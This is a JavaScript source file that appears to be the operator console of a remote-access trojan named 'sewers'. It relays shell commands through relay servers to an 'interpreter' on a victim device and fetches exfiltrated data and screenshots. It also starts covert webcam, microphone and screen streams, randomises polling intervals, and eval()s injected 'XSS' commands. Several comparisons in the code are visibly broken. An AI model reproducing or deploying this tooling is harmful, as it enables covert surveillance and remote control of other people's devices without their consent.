
/* Set functions for terminal.html */

	// Generate random string
	randomString = async (min, max) => {
		length = ( min + ( Math.random() * (max - min) ) )

		chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

		buffer = ""

		while (buffer.length < length) {
			index = parseInt( Math.random() * chars.length )
			buffer = buffer + chars.charAt(index)
		}

		return buffer
	}

	// Dilate seconds
	dilateTime = async (min, max) => {
		return ( min + ( Math.random() * (max - min) ) )
	}

	// Print to terminal
	print = async html => {
		now = new Date()
		timestamped = document.createElement("stamp")
		timestamped.setAttribute("time", now)
		timestamped.innerHTML = html
		terminal.append(timestamped)
		// // For some reason appending is done synchronously??
		setTimeout(async()=>{
			shrinkInputField()
			resetClearBreaks()
			if (scrollOnOutput) {
				scrollToBottom()
			}
		}, 40)
	}

	// Return readable timestamp
	timestamp = async () => {
		return new Date().toLocaleString().toUpperCase().replace(",", " ").replace(/\//g, "-")
	}

	// Print commands
	printCommands = async () => {
		$.ajax({
			method: "get",
			url: "../../help.html",
			success: res => {
				print(res)
			}
		})
	}

	// Get current User-Agent of sewers (used in requests sent to relays)
	getsewersUserAgent = async () => {
		useragent = ""

		$.ajax({
			method: "GET",
			url: "/useragent",
			async: false,
			success: res => {
				useragent = res
			}
		})

		return useragent
	}

	printSessionInfo = async () => {
		icon = ""

		if ( session_config["os"].indexOf("Android" || "android") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_android.svg\" />"
		} else if ( session_config["os"].indexOf("iOS" || "ios") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_apple.svg\" />"
		} else if ( session_config["os"].indexOf("cygwin" || "cygwin" || "mswin" || "mingw" || "bccwin" || "wince" || "emx") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_windows.svg\" />"
		} else if ( session_config["os"].indexOf("Darwin" || "darwin") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_apple.svg\" />"
		} else if ( session_config["os"].indexOf("Linux" || "linux") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_linux.svg\" />"
		}

		print(" " + icon + " <span class=\"bold\">" + session_config["os"] + "<br></span>" + 
			"<span class=\"grey\">Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</span> <span class=\"bold\">" + session_config["device"] + "<br></span>" + 
			"<span class=\"grey\">Hostname&nbsp;&nbsp;&nbsp;:</span> <span class=\"bold\">" + session_config["hostname"] + "<br></span>" + 
			"<span class=\"grey\">Session&nbsp;ID&nbsp;:</span> <span class=\"bold\">" + session_config["session_id"] + "<br></span>" + 
			"<span class=\"grey\">User-Agent&nbsp;:</span> <span class=\"bold\">" + session_config["user_agent"] + "<br><br></span>" + 
			"<span>Interpreter is fetching packets every <span class=\"bold\">" + session_config["fetch_rate"].replace("-", "</span> to <span class=\"bold\">") + "</span> seconds</span>.<br></span>" + 
			"<hr>" + 
			"<span class=\"bold\">sewers v1.0<br></span>" + 
			"<span class=\"grey\">User-Agent&nbsp;:</span> <span class=\"bold\">" + getsewersUserAgent() + "<br><br></span>" + 
			"<span>Type <span class=\"orange bold\">?</span>, <span class=\"orange bold\">h</span> or <span class=\"orange bold\">help</span> for more info.<br></span>"
		)
	}

	// checkStreams = () => {
	// 	print(request_tag + "<span title=\"" + timestamp() + "\">Checking active streams...</span>")
	// 	$.ajax({
	// 		method: "post",
	// 		url: "/",
	// 		data: "data=CHECKSTREAMS&session_id=" + session_id,
	// 		success: res => {
	// 			print("<span>Active streams: </span>" + res)
	// 		}
	// 	})
	// }

	// Return StdIn to sewers
	stdIn = async data => {
		data = {
			"body" : data,
			"session_id" : session_id,
			"encryption_key_one" : session_config["encryption_key_one"],
			"relay_address": relay_config["relay_address"],
			"request_tag": relay_config["sewers_post_tag"]
		}
		$.ajax({
			method: 'post',
			url: '../../post',
			dataType: 'json',
			data: data
		})
	}

	// Change fetch rate
	changeFetchRate = async (min, max) => {
		$.ajax({
			method: 'post',
			url: '../../post',
			data: 'body=' + session_config['fetch_rate_tag'] + ' ' + min + ' ' + max + '&session_id=' + session_id + '&encryption_key_one=' + session_config['encryption_key_one'] + '&relay_address=' + relay_config['relay_address'] + '&request_tag=' + relay_config['sewers_post_tag'],
			mimeType: 'text/plain; charset=UTF-8',
			success: () => {
				print("<span>Interpreter will be fetching packets every <span class=\"bold\">" + min + "</span> to <span class=\"bold\">" + max + "</span> seconds next time it fetches packets<br></span>")
				session_config["fetch_rate"] = min + "-" + max
			}
		})
	}
	// changeFetchRate = (min, max) => {
	// 	old_rate = session_config['fetch_rate']
	// 	old_max_rate = old_rate.replace(/.*\-/g, "")
	// 	$.ajax({
	// 		method: 'post',
	// 		url: '../../post',
	// 		data: 'body=' + session_config['fetch_rate_tag'] + ' ' + min + ' ' + max + '&session_id=' + session_id + '&encryption_key_one=' + session_config['encryption_key_one'] + '&relay_address=' + relay_config['relay_address'] + '&request_tag=' + relay_config['sewers_post_tag'],
	// 		mimeType: 'text/plain; charset=UTF-8',
	// 		success: () => {
	// 			onResponse = (()=>{
	// 				session_config['fetch_rate'] = min + '-' + max
	// 				$.ajax({
	// 					method: 'get',
	// 					url: '../../config/' + relay + '/' + session_id,
	// 					data: 'fetch_rate=' + min + '-' + max,
	// 					mimeType: 'text/plain; charset=UTF-8',
	// 					async: false,
	// 					success: () => {
	// 						fetch_delays = min + '-' + max
	// 						min_fetch_delay = fetch_delays[0]
	// 						fetch_dilation = fetch_delays[1] - fetch_delays[0]
	// 						delay = parseFloat( Math.random() * fetch_dilation ) + parseFloat(min_fetch_delay)

	// 						new_load_line_width = 720 / delay
	// 						new_load_line_width < 5 ? new_load_line_width = 5 : ""

	// 						session_config['fetch_rate'] = min + '-' + max
	// 					},
	// 					error: () => {
	// 						print("<span class='red'>WARNING</span> This terminal was not able to update the relay's fetch rate.<br>The sewers and interpreter might be connecting to the relay out of fetch.<br>Please try again after " + old_max_rate + " seconds.<br>")
	// 					}
	// 				})
	// 			})
	// 		}
	// 	})
	// }

	// Fetch new packets from interpreter
	fetchPackets = async () => {
		await resetLoadLine()
		moveLoadLine()

		$.ajax({
			method: 'get',
			url: '../../get',
			data: 'packet_id=&session_id=' + session_id + '&encryption_key_one=' + session_config['encryption_key_one'] + '&relay_address=' + relay_config['relay_address'] + '&request_tag=' + relay_config['sewers_get_tag'],
			mimeType: 'text/plain; charset=UTF-8',
			success: res => {
				if (res.length > 0) {
					packets = res.split(',')
					for (i = 0; i < packets.length; i++) {
						let packetID = packets[i]
						$.ajax({
							method: 'get',
							url: '../../get',
							data: 'packet_id=' + packetID + '&session_id=' + session_id + '&encryption_key_one=' + session_config['encryption_key_one'] + '&relay_address=' + relay_config['relay_address'] + '&request_tag=' + relay_config['sewers_get_tag'],
							mimeType: 'text/plain; charset=UTF-8',
							success: (res, status, xhr) => {
								if (res.length > 0) {
									new Audio('../../assets/audio/bell.mp3').play()
									let type,
											plaintext = atob(res),
											time = timestamp()
									if ( plaintext.startsWith("\xff\xd8\xff") || plaintext.startsWith("\xFF\xD8\xFF") ) {
										type = 'image/jpg'
									} else if ( plaintext.startsWith("\x89PNG\r\n\x1a\n") || plaintext.startsWith("\x89PNG\r\n\x1A\n") ) {
										type = 'image/png'
									} else if ( plaintext.startsWith("GIF87a") || plaintext.startsWith("GIF89a") ) {
										type = 'image/gif'
									} else if ( plaintext.startsWith("<?xml") && plaintext.indexOf("<svg") >= 0 || plaintext.startsWith("<svg") ) {
										type = 'image/svg+xml'
									}
									print(response_tag + ' <span class="bold lightgreen">OK</span> <span>' + time + '</span><br>')
									if (type == 'image/png') {
										print('<img title="Response ID: ' + packetID + '" src="data:' + type + ';base64,' + res + '" /><br>')
									} else if (type == "" + type + "") {
										print('<img title="Response ID: ' + packetID + '" src="data:' + type + ';base64,' + res + '" /><br>')
									} else if (type == "" + type + "") {
										print('<img title="Response ID: ' + packetID + '" src="data:' + type + ';base64,' + res + '" /><br>')
									} else if (type == "" + type + "") {
										print(plaintext + '<br>')
									} else {
										print('<span title="Response ID: ' + packetID + '">' + escapeHTML(plaintext) + '</span>')
									}
									setTimeout(()=>{
									shrinkInputField()
									resetClearBreaks()
									scrollToBottom()
									}, 42)
								}
							}
						})
					}
				}
			}
		})
	}

	// Auto fetch
	autoFetcher = async () => {}

	// Start auto fetcher
	startAutoFetching = async (min, max) => {
		if (auto_fetching) {
			print("<span>Waiting for auto fetcher...<br></span>")
			auto_fetching = false
			autoFetcher = async () => {
				startAutoFetching(min, max)
			}
			return
		}
		auto_fetching = true
		fetch_delay = dilateTime(min, max) * 1000
		fetchPackets()
		autoFetcher = async () => {
			fetch_delay = dilateTime(min, max) * 1000
			fetchPackets()
			setTimeout(async()=>{
				autoFetcher()
			}, fetch_delay + 200) // wait for loadline
		}
		autoFetcher()
		print("<span>Fetching new packets from relay every <span class=\"bold\">" + min + "</span> to <span class=\"bold\">" + max + "</span> seconds.<br></span>")
	}

	// Stop auto fetcher
	stopAutoFetching = async (min, max) => {
		auto_fetching = false
		fetch_delay = 1000
		print("<span>Stopping auto fetcher...<br></span>")
		autoFetcher = async () => {
			print("<span>Auto fetcher stopped.<br></span>")
		}
	}

	// Get session config
	getSessionConfig = async (relay, session) => {
		$.ajax({
			method: 'get',
			url: '../../session/' + relay + '/' + session,
			mimeType: 'text/plain; charset=UTF-8',
			async: false,
			success: async res => {
				if (res != 'nil') {
					session_config = JSON.parse(res)
				}
			}
		})
	}

	// Get relay config
	getRelayConfig = async relay => {
		$.ajax({
			method: 'get',
			url: '../../config/' + relay,
			mimeType: 'text/plain; charset=UTF-8',
			async: false,
			success: async res => {
				if (res != 'nil') {
					relay_config = JSON.parse(res)
				}
			}
		})
	}

	// Move loadline
	moveLoadLine = async () => {
		new_width = parseInt( 720 / (fetch_delay / 1000) )
		new_width < 5 ? new_width = 5 : ""

		load_line.style.transition = "left " + fetch_delay + "ms linear"
		load_line.style.webkitTransition = "left " + fetch_delay + "ms linear"
		load_line.style.mozTransition= "left " + fetch_delay + "ms linear"
		load_line.style.msTransition = "left " + fetch_delay + "ms linear"
		load_line.style.oTransition= "left " + fetch_delay + "ms linear"
		load_line.style.left = "calc(100% + " + new_width + "px)"
	}

	// Reset loadline
	resetLoadLine = async () => {
		new_width = parseInt( 720 / (fetch_delay / 1000) )
		new_width < 5 ? new_width = 5 : ""

		load_line.style.width= new_width + "px"
		load_line.style.transition = "left 0s linear"
		load_line.style.webkitTransition = "left 0s linear"
		load_line.style.mozTransition= "left 0s linear"
		load_line.style.msTransition = "left 0s linear"
		load_line.style.oTransition= "left 0s linear"
		load_line.style.left = "-" + new_width + "px"
	}

	// Scroll to bottom
	scrollToBottom = async () => {
		scrollBox.scrollTop = terminal.getBoundingClientRect().height
	}

	// Set clear breaks for clear function
	resetClearBreaks = async () => {
		clearBreaks = parseInt( ( $(window).height() - 84 ) / 12 )
	}

	// Clear function
	clear = async () => {
		linebreaks = "<br>".repeat(clearBreaks)
		print(linebreaks)
	}

	// Append new stream to menu
	addStream = async (streamID, streamType) => {
		if (streamType == "STREAMMIC") {
			$("html body div.menu").append("<div class='item left' title='Stream ID: " + streamID + "' onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".wav\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'><div class='icon streammic'><div class='icon rec blinking'></div></div></div>")
		} else if (streamType == "STREAMMON") {
			$("html body div.menu").append("<div class='item left' title='Stream ID: " + streamID + "' onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'><div class='icon streammon'><div class='icon rec blinking'></div></div></div>")
		} else if (streamType == "STREAMCAM") {
			$("html body div.menu").append("<div class='item left' title='Stream ID: " + streamID + "' onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'><div class='icon eye'><div class='icon rec blinking'></div></div></div>")
		}
	}

	// Start new monitor stream
	streamMon = async (bitrate, resolution) => {
		request = $.ajax({
			method: "post",
			url: "/",
			data: "data=STREAMMON " + bitrate + " " + resolution + "&session_id=" + session_id,
			success: async res => {
				res = response.split(" ")
				streamID = res[0]
				streamFile = res[1]

				print(response_tag + " [<span class='green'>OK</span>] " + "<span>" + timestamp() + "</span>")
				if (res[0] == "Usage:") {
					print("<span>" + response + "</span>")
				} else {
					print("<span>Monitor stream started.</span>")
					print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
					print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4</a></span>")
					addStream(streamID, "STREAMMON")
				}
				!request
			}
		})
	}

	// Start new microphone stream
	streamMic = async bitrate => {
		request = $.ajax({
			method: "post",
			url: "/",
			data: "data=STREAMMIC " + bitrate + "&session_id=" + session_id,
			success: async res => {
				res = response.split(" ")
				streamID = res[0]
				streamFile = res[1]

				print(response_tag + " [<span class='green'>OK</span>] " + "<span>" + timestamp() + "</span>")
				if (res[0] == "Usage:") {
					print("<span>" + response + "</span>")
				} else {
					print("<span>Microphone stream started.</span>")
					print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
					print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".wav\", \"" + streamFile + ".wav\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".wav</a></span>")
					addStream(streamID, "STREAMMIC")
				}
				!request
			}
		})
	}

	// Start new webcam stream
	streamCam = async (bitrate, resolution) => {
		print(request_tag + "<span title='" + timestamp() + "'>Streaming webcam...</span>")
		request = $.ajax({
			method: "post",
			url: "/",
			data: "data=STREAMCAM&session_id=" + session_id,
			success: async res => {
				res = response.split(" ")
				streamID = res[0]
				streamFile = res[1]

				print(response_tag + " [<span class='green'>OK</span>] " + "<span>" + timestamp() + "</span>")
				if (res[0] == "Usage:") {
					print("<span>" + response + "</span>")
				} else {
					print("<span>Webcam stream started.</span>")
					print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
					print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4</a></span>")
					addStream(streamID, "STREAMCAM")
				}
				!request
			}
		})
	}

	// Escape HTML
	escapeHTML = async data => {
		return data.replace(/\&/g, "&amp;").replace(/\</g,"&lt;").replace(/\>/g,"&gt;").replace(/\"/g, "&quot;").replace(/\'/g,"&#39;").replace(/\//g, "&#x2F;").replace(/ /g, "&nbsp;").replace(/\t/g, "&emsp;").replace(/\n/g, "<br>")
	}

	// Strip strings (the Ruby way)
	strip = async data => {
		while	( data.split("")[0] == " " || data.split("")[0] == "\n" ) {
			data = data.slice(1)
		}
		while	( data.split("")[-1] == " " || data.split("")[-1] == "\n" ) {
			data = data.slice(0,-1)
		}
	return data
	}

	// Input handler
	onCommand = async () => {
		cmd = textarea.value
		textarea.value = ""

		if (cmd.length > 0) {
			if (cmd_history[0] != cmd) {
				cmd_history.unshift(cmd)
			}
		}
		cmd_history_i = 0

		print(request_tag + "<span title='" + timestamp() + "'>" + escapeHTML(cmd) + "</span><br>")
		if (cmd.split("")[0] == "#") {
			return
		} else if (cmd.split(" ")[0] == "startautofetching") {
			if (cmd.split(" ")[3]) {
				print('Too many arguments.<br>Usage: <span class="tan">startautofetching</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else if (!cmd.split(" ")[2]) {
				print('Not enough arguments.<br>Usage: <span class="tan">startautofetching</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
				print('Minimum value must be less than maximum.<br>Usage: <span class="tan">startautofetching</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
				print('Minimum value must be at least 1.<br>Usage: <span class="tan">startautofetching</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else {
				min = parseInt( cmd.split(" ")[1] )
				max = parseInt( cmd.split(" ")[2] )
				startAutoFetching(min, max)
			}
		} else if (cmd == "clear") {
			clear()
		} else if (cmd == "exit") {
			self.close() || alert("You can only use this in pop-up mode.")
		} else if (cmd.toLowerCase() == "?" || cmd.toLowerCase() == "help" || cmd.toLowerCase() == "h" || cmd.toLowerCase() == "commands" || cmd.toLowerCase() == "usage") {
			printCommands()
		} else if (cmd.toLowerCase() == "checkstreams") {
			checkStreams()
		} else if (cmd == "reset") {
			if (warnOnReset) {
				self.location = location.href
			}	else {
				$("body").html("")
				window.onbeforeunload = ""
				self.location = location.href
			}
		} else if (cmd == "stopautofetching") {
			stopAutoFetching()
		} else if (cmd.split(" ")[0].toLowerCase() == "streammon") {
			streamMon(cmd.split(" ")[1], cmd.split(" ")[2])
		} else if (cmd.split(" ")[0].toLowerCase() == "streammic") {
			streamMic(cmd.split(" ")[1])
		} else if (cmd.split(" ")[0].toLowerCase() == "info") {
			printSessionInfo()
		} else if (cmd == "fetch") {
			fetchPackets()
		} else if (cmd.split(" ")[0].toLowerCase() == "fetchrate") {
			if (cmd.split(" ")[3]) {
				print('Too many arguments.<br>Usage: <span class="tan">fetchrate</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else if (!cmd.split(" ")[2]) {
				print('Not enough arguments.<br>Usage: <span class="tan">fetchrate</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
				print('Minimum value must be less than maximum.<br>Usage: <span class="tan">fetchrate</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
				print('Minimum value must be at least 1.<br>Usage: <span class="tan">fetchrate</span> <span class="grey">' + escapeHTML('<MIN SECONDS> <MAX SECONDS>') + '</span><br>')
			} else {
				min = parseInt( cmd.split(" ")[1] )
				max = parseInt( cmd.split(" ")[2] )
				changeFetchRate(min, max)
			}
		} else if (cmd.split(" ")[0].toLowerCase() == "shell" || cmd.split(" ")[0].toLowerCase() == "sh") {
			cmd = cmd.split(' ')
			cmd.splice(cmd[0], 1)
			cmd = cmd.join(' ')
			stdIn( strip(cmd) )
		} else if (cmd.length > 0) {
			print( escapeHTML(cmd) + ': command not found. Type <span class="bold orange">help</span> to see a list of commands.<br>' )
		}
		textarea.focus()
	}

	// XSS input handler
	onXSSCommand = async () => {
		let command = jsfield.value
		let escapedCommand = escapeHTML(command)

		jsfield.value = ""
		textarea.focus()

		print(request_tag + " <span class='bold red'>XSS</span> <span>" + timestamp() + "</span><br>")
		print("<span class='red'>" + escapedCommand + "</span><br>")
		print( eval(command) + '<br>' )
	}
